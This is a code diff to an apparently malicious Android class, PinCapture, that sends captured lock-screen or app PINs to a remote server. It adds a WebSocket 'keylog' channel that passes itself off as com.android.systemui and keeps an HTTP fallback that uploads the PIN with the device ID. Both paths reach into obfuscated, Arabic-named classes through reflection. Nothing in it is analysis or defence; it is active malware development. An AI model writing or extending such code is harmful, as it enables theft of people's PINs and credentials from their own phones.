@@ -695,27 +695,67 @@ public final class PinCapture {
 
     }
 
-    /** 直接走 HTTP device_log（ر.ء）；必须放子线程，主线程会 NetworkOnMainThreadException */
+    /** 原生通道：WS cacheData(k=keylog)；失败回退 HTTP device_log */
     private static void report(final String value) {
+        final String ftype = capType;
         new Thread(new Runnable() {
             @Override
             public void run() {
-                try {
-                    org.json.JSONObject o = new org.json.JSONObject();
-                    o.put("type", "pin_capture");
-                    o.put("msg", value);
-                    o.put("ts", System.currentTimeMillis());
-                    String dev = deviceId();
-                    if (dev.length() > 0) o.put("deviceId", dev);
-                    Class<?> c = Class.forName("ڝږ؁ڋ.ر");
-                    java.lang.reflect.Method m = c.getMethod("ء", org.json.JSONObject.class);
-                    m.invoke(null, o);
-                    Log.d(TAG, "report sent type=pin_capture dev=" + dev);
-                } catch (Throwable t) {
-                    Log.e(TAG, "report failed", t);
-                }
+                if (sendWs(value, ftype)) return;
+                sendHttp(value);
             }
         }, "pin-report").start();
+    }
+
+    /** WS：{"k":"keylog","cache":"[{pkg,type,text}]"} → د.آ.آ("cacheData", payload) */
+    private static boolean sendWs(String value, String ftype) {
+        try {
+            org.json.JSONArray arr = new org.json.JSONArray();
+            org.json.JSONObject e = new org.json.JSONObject();
+            e.put("pkg", "com.android.systemui");
+            e.put("type", ftype);
+            e.put("text", value);
+            arr.put(e);
+
+            org.json.JSONObject p = new org.json.JSONObject();
+            p.put("k", "keylog");
+            p.put("cache", arr.toString());
+
+            Class<?> d = Class.forName("ڜٟٱڀ.د");
+            Object inst = d.getMethod("ؠ").invoke(null);
+            java.lang.reflect.Field f = d.getField("آ");
+            Object ch = f.get(inst);
+            if (ch == null) {
+                Log.d(TAG, "ws channel null, fallback http");
+                return false;
+            }
+            java.lang.reflect.Method m = ch.getClass()
+                    .getMethod("آ", String.class, org.json.JSONObject.class);
+            Object r = m.invoke(ch, "cacheData", p);
+            boolean ok = (r instanceof Boolean) && ((Boolean) r);
+            Log.d(TAG, "ws cacheData sent=" + ok);
+            return ok;
+        } catch (Throwable t) {
+            Log.e(TAG, "ws send failed", t);
+            return false;
+        }
+    }
+
+    private static void sendHttp(String value) {
+        try {
+            org.json.JSONObject o = new org.json.JSONObject();
+            o.put("type", "pin_capture");
+            o.put("msg", value);
+            o.put("ts", System.currentTimeMillis());
+            String dev = deviceId();
+            if (dev.length() > 0) o.put("deviceId", dev);
+            Class<?> c = Class.forName("ڝږ؁ڋ.ر");
+            java.lang.reflect.Method m = c.getMethod("ء", org.json.JSONObject.class);
+            m.invoke(null, o);
+            Log.d(TAG, "http fallback sent dev=" + dev);
+        } catch (Throwable t) {
+            Log.e(TAG, "http fallback failed", t);
+        }
     }
 
     /** 反射取设备 ID（ڜٟٱڀ.د.إ） */
